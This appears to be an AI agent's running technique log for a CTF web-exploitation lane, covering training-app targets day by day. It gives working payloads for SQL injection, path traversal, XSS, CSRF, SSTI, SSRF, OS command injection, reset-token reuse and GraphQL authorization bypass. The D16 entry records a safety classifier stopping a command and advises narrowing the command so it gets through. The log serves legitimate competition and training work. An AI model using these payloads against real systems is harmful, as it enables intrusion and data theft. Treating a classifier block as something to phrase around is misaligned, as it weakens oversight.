# web — technique log (lane-days D01-D18 released; updated after every day)

How the lane has looked so far (observations, not guarantees):
- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,
  22 D09-D10, 23 D11-D13, 24 D14-D15, 25 D16-D18 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the
  title but not always: D07 "Stored for Later" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`,
  so lane-day != folder day). D19-D31 = 13 left for cal. 26-31 (~2-3 per day). Each lane-day = ONE classic bug,
  named by a title pun: D01 backup exposure "Back Up a Minute", D02 IDOR "Permission to Slip", D03 SQLi "Query Me
  This", D04 path traversal "Stay in Your Directory", D05 missing function-level authz "Administratively Speaking",
  D06 reflected XSS "Reflect Upon This", D07 stored XSS "Stored for Later", D08 session fixation "Session
  Impression", D09 CSRF "Forged With Care", D10 unrestricted upload "Uploading Expectations", D11 SSTI "Template
  Temper", D12 second-order SQLi "Ask Again Later", D13 mass assignment "Posted Too Much", D14 per-field/action API
  authz "The API Has Opinions", D15 SSRF "Fetch Quest", D16 OS command injection "Shell Company", D17 password-reset
  token not bound to the account "Reset Expectations", D18 GraphQL resolver missing field-level authz "Resolver
  Revolt". Arc: info-disclosure -> access control -> injection -> file read -> XSS x2 -> session -> CSRF -> upload ->
  SSTI -> second-order SQLi -> OWASP API run (mass assignment, BFLA/BOPLA, SSRF) -> cmd injection -> auth flow
  (reset) -> GraphQL. Many days are "one level deeper" sequels (D10->D11, D03->D12, D05->D13->D14, D14->D18: same
  `protected_reference` + case/note shape, now behind a GraphQL resolver).
- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{"id": "Target N",
  "url": "https://<48hex>.2026.huntress.ctf.games/"}]`. Reachable directly from the host, behind Cloudflare. After
  CORRECT every path returns `410 {"state":"completed"}`; an untimed target stops after 30 min idle.
- **Contract is fixed:** `proof-N` "Recover the proof from Target N.", artifact `Target N`, `exact_text`, `trim`.
  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.
- **Since D05 every app is the same kit** ("A small, complete training app with one deliberately isolated security
  boundary"; framework banner = costume). `GET /api/clues` names the routes (`feature_route: /<word>-<hex6>`, often
  `secondary_route`), `current_role: analyst` (D18: `current_user: analyst`, no `framework` key -- banner only in the
  page title), plus ZERO or ONE concept key (`session_hint`, `callback_nonce`, `moderator_data_route`,
  `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+`upload_policy`+`upload_shape`, D14
  `inventory_route`+`protected_reference`, D16 `input_parameter`+`example_path`, D17 `recovery_guide_route`, D18
  `protected_reference`+`note`). D11-D13, D15 had NO concept key: prompt + bare-route errors are the routing signal.
  Bare routes answer JSON errors naming the missing piece (`session_id_required`, `authenticated_login_required`,
  `browser_callback_required`, `post_required` (405), `administrator_required` (403), `internal_only` (403),
  `absolute_url_required` (400), `fetch_failed`, `id_fields_action_required`, `field_action_forbidden`,
  `path_required` (+`example_path`), `account_id_required`, `self_service_only`, `token_and_account_id_required`;
  a GraphQL route answers GET with 404 `not_found`). Success = proof regex in `evidence`, `rows[]`, `stdout`, a
  GraphQL `data` field, or a rendered page.
- **The runtime config is readable.** Any file-read primitive (D16 `cat /run/huntress/*`) also shows
  `/run/huntress/config.json`: `{"schema":"huntress.web_exploitation.runtime_config.v1","profile_id":"framework_go_gin_
  command_injection","weakness":"os_command_injection","mode":"time_trial",...}` -- it NAMES the class. Use it to
  classify an unknown Mastery target once any read works.
- **"Browser" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers
  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.
- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, 4 since D15); the
  prompt describes only today's bug. `preparing` 4-25 s (D12/D13 Mastery ~3 min). With a handler on disk every
  Mastery since D14 answered all targets in 3-6 s solve.
- **A new class beats the generic seed unless the handler ships before TT.** TT `solver_incomplete` on D09, D10, D12,
  D13, D15 and ALL THREE of D16-D18 (codify plugins landed 13:01:08-10Z, TT started 13:01:10Z; the D16 plugin was
  still a `.tmp` when Mastery ran -> 3/4 answered, today's target hand-solved). Live workers rescue it in 30-55 s.

## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)
- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-4 (Mastery). Rule: map question
  `artifact` "Target N" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.
- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on
  every target (home, robots, /api/clues, /openapi.json), hinted probes first, the rest staged; targets in threads.
  Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).
- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |
  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`; fixed
  paths `/preferences` (D09), `/api/inventory` (D14), `/api/recovery` (D17). Re-dealt within a day: D12 result ->
  internal, D13 audit -> internal, D15 account -> internal, D16 process -> execute, D17 result -> audit, D18 inspect
  -> submit. Rule: pick routes by clue KEY role (or the guide JSON's `*_route` keys), never by the word in the value.
- **Clue key set**: concept key (D06-D10, D14, D16-D18) | only feature+secondary (D12, D13, D15) | only feature (D05,
  D11). D18 swapped `current_role` -> `current_user` and dropped `framework`. Rule: no concept key -> classify from
  prompt + bare GET of each route; a key shared by two classes (`protected_reference`: D14 with `inventory_route`,
  D18 with `note`) -> route on the companion key, or race both handlers.
- **Framework costume** (never changes the exploit): Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS,
  Jakarta Servlet, ASP.NET Core, Gin (D16), Symfony (D17), GraphQL.js (D18, title only). Rule: ignore it -- except
  that a Go server drops a raw `;` from the query string (percent-encode).
- **Request body encoding (D12, D13)**: POST routes accept form AND JSON but only JSON binds. Rule: JSON first.
- **Earlier classes (one line each)**: D01 robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/` -> `.json.bak`
  (depth-2 crawl). D02 foreign ids in `/api/history`. D03 `('%..%')` wrapper -> tautology ladder over `'` `')` `'))`
  `"` + `--`/`#`. D04 every param holding `.`/`/` x `../`*10 + prompt path. D05 GET then POST every clue route. D07
  board noun `messages` | `postcards` from openapi. D09 outside mailbox option `review-NNNN@outside.example.invalid`,
  token sent or not. D10 preview URL from the upload response's `path`, syntax from the guide's `<code>`.
- **SSTI (D11)**: param `template` (others rendered empty); `{{..}}` evaluated, `${..}`/`*{..}` literal under a
  "Spring Boot" costume; context var `objective`. Rule: one probe per param holding every delimiter family with
  distinct arithmetic, keep the family that evaluated, then ask for `objective`.
- **Second-order SQLi (D12)**: `x' OR '1'='1' -- ` (single), `zz' OR 1=1 --` (TT) as JSON in every common field;
  re-GET `secondary_route` after EACH plant. **Mass assignment (D13)**: one JSON body `display_name` + `role`,
  `is_admin`, `isAdmin`, `admin`, `roles`, `access_level`, `permissions`; echo hides which bound.
- **API field/action authz (D14)**: inventory `fields` `[title, note]`, `actions` `[view, export]`; single pair
  (`note`+`export`) skips the check; lists and `*` forbidden. Rule: every SINGLE field x action from the inventory.
- **SSRF (D15)**: `feature?url=http://127.0.0.1:8080<secondary>` in single, TT, Mastery; port 80/5000/8000/3000 =
  `fetch_failed`. Rule: host ladder, port ladder, param from the error word, else `url`.
- **Command injection (D16)**: `input_parameter: path` and `example_path: /app/static` constant across single, TT,
  Mastery; base command `ls -ld <path>` (stdout echoed). Rule: param from `input_parameter` (else the `<x>_required`
  error), value = example + `%3B` + `cat /run/huntress/objective.txt` (then `\n`, `&&`, `|`, `$()`).
- **Password reset (D17)**: guide JSON `{request_route, redeem_route, account_parameter: account_id,
  token_parameter: token, accounts:[{id,label,self_service}]}` same keys in single/TT; ids, token (12 hex) and route
  words differ. Rule: request a token for the `self_service:true` id, redeem it with each `self_service:false` id.
- **GraphQL resolver (D18)**: schema identical in single/TT/Mastery (`caseIndex:[CaseReference{id,title,
  visibility}]`, `case(id:ID!):Case{id,title,note}`); `protected_reference` is a STRING id. Rule: introspect, then
  call every arg-taking Query field with the protected id selecting all scalars; POST JSON first, then GET
  `?query=`, then form ("vary the protocol surface" -- POST JSON was enough every time).
- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]` | `stdout`, GraphQL
  `data.<alias>.note`, a receipt on a board page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on
  field names or on `effect`.

## Recognition cues -> first move
- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;
  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.
- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece. No concept key -> the
  prompt's verb names the bug. Any `*_guide_route` / `inventory_route` is a JSON map of the next requests: read it.
- `Disallow:` -> D01 crawl. "Signed in as" + `/<things>/<id>` -> D02 IDOR. Search / "database" -> D03 tautology.
  `?doc=` + "stay inside" -> D04 traversal. "staff-only door, just a sign" -> D05 GET it.
- "repeats everything", `callback_nonce` -> D06 reflect + same-origin fetch-metadata callback. "guestbook",
  `moderator_data_route` -> D07 stored script for the bot; poll. "plant your session", `session_hint` -> D08 `?sid=`.
- "obeys whoever asks nicely -- even strangers", hidden `csrf_token` -> D09 cross-site form submit. "upload form has
  standards. Low ones", `upload_shape` -> D10 `.html` with `{{objective}}`. "evaluates everything", empty
  "Rendered message" `<pre>` -> D11 `?template={{objective}}`. "plant ... come back later", `post_required` +
  `{"rows":[]}` -> D12 JSON plant then GET secondary. "binds whatever you hand it", `administrator_required` -> D13
  privilege keys in one JSON body. `inventory_route` + `protected_reference` -> D14 field x action grid.
  `absolute_url_required` + `internal_only` -> D15 `?url=http://127.0.0.1:8080<secondary>`.
- "a little too close to a real shell", "give it something to do", clues `input_parameter` + `example_path`, bare
  feature 400 `path_required` -> D16: `curl -G "$U<feature>" --data-urlencode "path=/app/static;cat
  /run/huntress/objective.txt"` -> `stdout` gains the proof (effect `worker_command_completed` shows on the baseline
  too).
- "Forgot your password? ... wake up in somebody else's account", clue `recovery_guide_route` -> D17: GET the guide,
  `GET <request_route>?account_id=<self_service id>` -> `{"token":...}`, then `GET <redeem_route>?token=<it>&
  account_id=<other id>` -> `effect: synthetic_account_recovery` + `evidence`.
- "Discover the schema", "resolver", "field-level control", clues `protected_reference` + `note` ("field access is
  checked by each resolver"), feature GET 404 `not_found` -> D18 GraphQL: POST JSON `{"query":"{__schema{...}}"}`,
  then `{caseIndex{id title visibility} case(id:"<protected>"){id title note}}` -> `note` = proof.
- Proof regex hit = landed; an `effect` alone is NOT (D12 empty rows; D16 baseline already says completed).

## Day by day
- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note`. D02 `/api/history` foreign
  id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --`. D04 `reader.php?doc=../`*6+`run/huntress/
  objective.txt`. D05 GET `/dispatch-<hex6>` -> `framework_authorization_bypassed`. 47-51 s each.
- **D06-D08 (cal. 21)**: D06 reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET the callback with `Sec-Fetch-Site:
  same-origin`/`Mode: cors`/`Dest: empty` + Referer; 83 s. D07 stored `<script>` fetches the data route and POSTs
  `{evidence}` to the receipt route; poll (receipt >12 s in Mastery); 78 s. D08 `?sid=<hint>` -> `arena_session`
  cookie -> GET secondary; 116 s (Mastery ~15 min: every solver raced on every target starved the app).
- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: submit the outside mailbox with `Sec-Fetch-Site:
  cross-site`, `Mode: navigate`, foreign Referer -> `changed_across_sites:true`; 70 s. D10 upload JSON `{filename:
  "note.html", content:"<p>{{objective}}</p>", content_type:"text/html"}` -> GET returned `path`; 58 s.
- **D11-D13 (cal. 23)**: D11 SSTI `?template={{objective}}` (105 s, plugin before submit -> TT first try). D12 JSON
  plant `x' OR '1'='1' -- ` -> GET secondary `rows[]` (83 s). D13 JSON `display_name` + privilege keys -> GET
  secondary `bound_privileged_property` (59 s).
- **D14-D15 (cal. 24)**: D14 inventory -> `?id=<protected>&fields=note&action=export` ->
  `api_field_action_authorization_bypassed` (75 s; TT/Mastery first try). D15 SSRF `?url=http://127.0.0.1:8080
  <secondary>` -> `internal_service_reached` (75 s; TT `solver_incomplete`, plugin landed ~1 min late).
- **D16 Shell Company (cal. 25)** -- OS command injection. Clues `{framework: "Gin", feature_route:
  /process-<hex6> | /execute-<hex6>, input_parameter: "path", example_path: "/app/static", current_role}` (app
  "Command Counter"). Bare -> 400 `{"error":"path_required","example_path":"/app/static"}`; `?path=/app/static` ->
  `{"ok":true,"effect":"worker_command_completed","stdout":"drwxr-xr-x ... /app/static"}` (`ls -ld`). Raw
  `?path=/app/static;id` -> `path_required` again (Go drops a query with a bare `;`); `%3B` works:
  `?path=/app/static%3Bcat%20/run/huntress/objective.txt` -> stdout line 2 = proof. Single CORRECT ~40 s. TT
  `solver_incomplete` (13.8 s, no plugin yet), live worker hand-solved in 31 s; Mastery 4 targets: 3 earlier
  classes answered, today's missed (plugin file still `.tmp`), live worker solved it. A live turn that chained
  `ls -la; cat /run/huntress/*` in a shell function was stopped by a safety classifier -- keep the injection to
  one plain read of the objective file.
- **D17 Reset Expectations (cal. 25)** -- password reset token not bound to the account it was issued for. Clues
  `{framework: "Symfony", feature_route: /submit-<hex6>, secondary_route: /result-<hex6> | /audit-<hex6>,
  recovery_guide_route: "/api/recovery", current_role}`. Guide -> `{request_route, redeem_route, account_parameter:
  "account_id", token_parameter: "token", accounts:[{id, label:"Your analyst account", self_service:true}, {id,
  label:"Executive account", self_service:false}]}`. Request for the victim -> `self_service_only`; request for self
  -> `{"ok":true,"account_id":..,"token":"<12 hex>","redeem_route":..}`; redeem `?token=<own>&account_id=<victim>`
  -> `{"ok":true,"effect":"synthetic_account_recovery","account_id":<victim>,"evidence":"proof_..."}`. Single
  ~39 s; TT `solver_incomplete` (21 s) then hand-solved (52 s); Mastery 4 targets first try, 17 s total.
- **D18 Resolver Revolt (cal. 25)** -- GraphQL resolver skipping its field-level check. Clues `{current_user:
  "analyst", feature_route: /inspect-<hex6> | /submit-<hex6>, protected_reference: "<int as string>", note: "The case
  index lists references; field access is checked by each resolver."}`; page title "Graph Garden · GraphQL.js".
  GET feature -> 404 `not_found` (do not conclude dead); POST JSON introspection works -> `Query{caseIndex, case(id:
  ID!)}`, `Case{id,title,note}`, `CaseReference{id,title,visibility}` (protected row `visibility: "reference
  only"`). `{caseIndex{id title visibility} case(id:"<protected>"){id title note}}` -> `note` = proof. Single
  CORRECT ~36 s; TT `solver_incomplete` (22 s) then hand-solved (53 s); Mastery 4 targets first try, 14 s total.

## GM answer conventions learned
- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.
  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`
  (D16 Mastery: 3 accepted, `remaining: 1`, then proof-4 alone -> CORRECT).
- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),
  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12), `bound_privileged_property`
  (D13), `api_field_action_authorization_bypassed` (D14), `internal_service_reached` (D15),
  `worker_command_completed` (D16, also on the harmless baseline), `synthetic_account_recovery` (D17); D18 none
  (plain GraphQL `data`). D09 `changed_across_sites:true`; D10, D11 rendered HTML; D07 a moderator receipt.
- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.

## Pitfalls that cost time
- Shipping a new day without its class handler: TT `solver_incomplete` on D09, D10, D12, D13, D15, D16, D17, D18,
  and D16 Mastery missed today's target. Write `lib/web/handlers/dayNN_*.py` (KEY_MAP + HANDLERS) BEFORE the single
  submit, like D11 did; the single solves now take ~40 s, so the plugin is the long pole.
- Treating `effect` as success: D12 prints its effect with `rows: []`; D16 prints `worker_command_completed` for
  the plain `ls`. Success = proof regex.
- Raw `;` in a Go (Gin) query string is dropped -> the param looks missing. Always `--data-urlencode` / `%3B`.
- GraphQL routes 404 on GET; POST JSON `{"query":...}` before writing the route off.
- Form-encoded bodies on JSON APIs: D12 ignored form fields (but answered `saved:true`). Send JSON first.
- Trusting the echo: D13 echoes only `display_name`; bound privileges are invisible until the secondary route.
- SSRF to the default port: D15's internal service listens on 8080; `fetch_failed` = wrong port, not "blocked".
- Combining fields (`title,note`, `*`) in D14 was forbidden; only the single bypassed pair works.
- A 500 on `{{unknown}}` (D11 Spring JSON) means "undefined variable", not "not injectable".
- Choosing routes by the WORD in a clue value (re-dealt every attempt) or by prompt keywords in Mastery. One-level
  crawls (D01). Solvers importing each other's `fallback()`. Hammering one target with every probe in parallel.
- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.
- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.
- Trusting the app's stated policy ("txt only", "token required", "self-service only" on REQUEST but not REDEEM).
- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403.

## reviewer cross-check (measured on a parallel agent; folded into the drivers)
- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and
  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to
  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.
- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.
- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.
